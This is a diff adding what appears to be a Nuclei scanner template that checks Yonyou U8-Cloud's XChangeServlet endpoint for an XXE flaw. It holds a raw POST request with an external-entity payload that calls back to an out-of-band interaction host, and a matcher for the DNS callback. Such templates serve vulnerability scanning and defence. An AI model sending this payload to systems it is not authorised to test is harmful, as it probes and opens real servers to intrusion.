@@ -1,0 +1,30 @@
+id: yongyouOA-U8-Cloud-XChangeServlet-xxe
+info:
+  name: 用友U8-Cloud系统XChangeServlet接口存在XXE漏洞
+  author: cnaq
+  severity: critical
+  description: 用友U8-Cloud系统XChangeServlet接口存在XXE漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BU8-Cloud%E7%B3%BB%E7%BB%9FXChangeServlet%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8XXE%E6%BC%8F%E6%B4%9E.md
+  tags: weaver,rce
+
+requests:
+  - raw:
+      - |
+        POST /service/XChangeServlet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+        Content-Length: 129
+        Connection: close
+        Content-Type: text/xml
+        Accept-Encoding: gzip
+
+        <!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "http://{{interactsh-url}}">]><r><a>&xxe;</a ></r>
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
